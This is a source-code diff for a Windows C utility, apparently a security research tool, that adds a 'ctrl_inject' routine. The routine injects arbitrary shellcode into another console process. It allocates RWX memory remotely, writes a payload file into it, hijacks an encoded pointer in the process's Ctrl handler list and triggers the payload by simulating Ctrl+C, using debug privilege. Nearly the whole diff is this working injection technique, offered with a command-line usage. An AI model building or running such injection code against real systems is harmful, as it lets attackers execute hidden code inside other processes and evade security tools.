@@ -169,10 +169,9 @@ BOOL IsCodePtrEx(HANDLE hp, LPVOID ptr) {
             (mbi.Protect == PAGE_EXECUTE_READ));
 }
 
-VOID ScanSystem(DWORD pid) {
-    HANDLE                  ss;
+VOID ctrl_list(DWORD pid) {
     PROCESSENTRY32          pe;
-    HANDLE                  hp;
+    HANDLE                  ss, hp;
     PHANDLER_ROUTINE        *HandlerList, Handler;
     SIZE_T                  rd;
     LPVOID                  hl_va, ptr;
@@ -208,6 +207,7 @@ VOID ScanSystem(DWORD pid) {
           
           printf("\nHandlerList: %p for %04i : %ws\n", 
             (LPVOID)HandlerList, pe.th32ProcessID, pe.szExeFile);
+            
           // read each pointer
           for(i=0;;i++) {
             ptr = (PBYTE)HandlerList + (i * sizeof(ULONG_PTR)); 
@@ -224,22 +224,137 @@ VOID ScanSystem(DWORD pid) {
     CloseHandle(ss);
 }
 
-void TriggerCtrlC(HWND hWnd) {
+// simulate CTRL+C
+void SendCtrlC(HWND hWnd) {
     INPUT ip;
-
+    
     SetForegroundWindow(hWnd);
     
     ip.type           = INPUT_KEYBOARD;
     ip.ki.wScan       = 0;
     ip.ki.time        = 0;
     ip.ki.dwExtraInfo = 0;
+    
     ip.ki.wVk         = VK_CONTROL;
     ip.ki.dwFlags     = 0;
     SendInput(1, &ip, sizeof(INPUT));
 
     ip.ki.wVk         = 'C';
+    ip.ki.dwFlags     = 0;
+    SendInput(1, &ip, sizeof(INPUT));
+    
+    ip.ki.wVk         = 'C';
     ip.ki.dwFlags     = KEYEVENTF_KEYUP;
     SendInput(1, &ip, sizeof(INPUT));
+    
+    ip.ki.wVk         = VK_CONTROL;
+    ip.ki.dwFlags     = KEYEVENTF_KEYUP;
+    SendInput(1, &ip, sizeof(INPUT));
+    
+    Sleep(1000);
+}
+
+void ctrl_inject(DWORD pid, LPVOID payload, DWORD payloadSize) {
+    HANDLE                  hp;
+    SIZE_T                  rd, wr;
+    DWORD                   i, id;
+    HWND                    hw = NULL;
+    PHANDLER_ROUTINE        *HandlerList, Handler;
+    LPVOID                  hl_va, heap_ptr, enc_ptr, last_ptr, cs;
+    _RtlDecodeRemotePointer RtlDecodeRemotePointer;
+    _RtlEncodeRemotePointer RtlEncodeRemotePointer;
+    
+    // 1. Resolve virtual address of HandlerList and function encoders
+    for(;;) {
+      hw = FindWindowEx(NULL, hw, L"ConsoleWindowClass", NULL);
+      if(hw == NULL) break;
+      
+      GetWindowThreadProcessId(hw, &id);
+      if(id == pid) break;
+    }
+    
+    hl_va = GetHandlerListVA();
+    
+    RtlDecodeRemotePointer = (_RtlDecodeRemotePointer)
+      GetProcAddress(GetModuleHandle(L"ntdll"), 
+      "RtlDecodeRemotePointer");
+
+    RtlEncodeRemotePointer = (_RtlEncodeRemotePointer)
+      GetProcAddress(GetModuleHandle(L"ntdll"), 
+      "RtlEncodeRemotePointer");
+
+    if(hw                     == 0    ||
+       hl_va                  == NULL ||
+       RtlDecodeRemotePointer == NULL ||
+       RtlDecodeRemotePointer == NULL) return;
+       
+    // 2. Open process for read,write and allocate operations
+    hp = OpenProcess(
+      PROCESS_VM_OPERATION |
+      PROCESS_VM_READ      |
+      PROCESS_VM_WRITE, 
+      FALSE, 
+      pid);
+      
+    if(hp == NULL) return;
+
+    // 3. Read the heap pointer from remote process
+    ReadProcessMemory(hp, hl_va, 
+      &HandlerList, sizeof(ULONG_PTR), &rd);        
+      
+    // read each pointer to find last one in list
+    for(last_ptr = NULL, i = 0;; i++) {
+      heap_ptr = (PBYTE)HandlerList + (i * sizeof(ULONG_PTR)); 
+      
+      // read encoded pointer
+      ReadProcessMemory(hp, heap_ptr, &enc_ptr, sizeof(ULONG_PTR), &rd);
+      
+      // decode it
+      RtlDecodeRemotePointer(hp, enc_ptr, (PVOID*)&Handler);
+      
+      // if this doesn't point to code in remote process, exit loop
+      if(!IsCodePtrEx(hp, Handler)) break;
+
+      // save heap address of this handler
+      last_ptr = heap_ptr;
+    }
+    
+    // if we have a heap address of handler
+    if(last_ptr != NULL) {
+      // backup existing encoded handler
+      ReadProcessMemory(hp, last_ptr, 
+        &enc_ptr, sizeof(ULONG_PTR), &rd);
+      
+      // allocate RWX memory in remote process
+      cs = VirtualAllocEx(
+        hp, 
+        NULL, 
+        payloadSize, 
+        MEM_COMMIT | MEM_RESERVE, 
+        PAGE_EXECUTE_READWRITE);
+        
+      if(cs != NULL) {
+        // write payload
+        WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
+        
+        // encode pointer to payload
+        RtlEncodeRemotePointer(hp, cs, (PVOID*)&Handler);
+        
+        // overwrite pointer in HandlerList for remote process
+        WriteProcessMemory(hp, last_ptr, 
+          &Handler, sizeof(PHANDLER_ROUTINE), &wr);
+          
+        // execute
+        SendCtrlC(hw);
+
+        // restore original function
+        WriteProcessMemory(hp, last_ptr, 
+          &enc_ptr, sizeof(PHANDLER_ROUTINE), &wr); 
+
+        VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
+      }
+    }
+    CloseHandle(hp);
 }
 
 BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
@@ -260,7 +375,6 @@ BOOL CALLBACK EnumThreadWndProc(HWND hwnd, LPARAM lParam) {
     return TRUE;
 }
 
-  
 VOID EnumProcessWindows(DWORD pid) {
     DWORD         i, cnt = 0;
     HANDLE        ss;
@@ -302,23 +416,35 @@ VOID ListConsoles(VOID) {
 }
 
 int wmain(int argc, WCHAR *argv[]) {
-    DWORD pid = 0;
+    DWORD  pid = 0;
+    SIZE_T len;
+    LPVOID pic;
     
     ListConsoles();
     
     SetPrivilege(SE_DEBUG_NAME, TRUE);
     SymSetOptions(SYMOPT_DEFERRED_LOADS);
     
-    // scan process? get the pid
-    if(argv[1] != NULL) {
-      pid = name2pid(argv[1]);
-      if(pid == 0) pid = wcstoull(argv[1], NULL, 10);
-      if(pid == 0) {
-        wprintf(L"ERROR: unable to resolve pid for \"%s\".\n", argv[1]);
-        return -1;
-      }
+    if(argc < 2) {
+      printf("\nusage: ctrl_inject <process> <payload.bin>\n");
+      return 0;
     }
-    ScanSystem(pid);
+
+    pid = name2pid(argv[1]);
+    
+    if(pid == 0) pid = wcstoull(argv[1], NULL, 10);
+    if(pid == 0) { 
+      printf("unable to obtain process id for %ws\n", argv[1]);
+      return 0;
+    }
+    
+    if(argc == 3) {
+      len = readpic(argv[2], &pic);
+      if (len == 0) { printf("\ninvalid payload\n"); return 0;}
+      ctrl_inject(pid, pic, len);
+    } else {
+      ctrl_list(pid);
+    }
     return 0;
 }
 
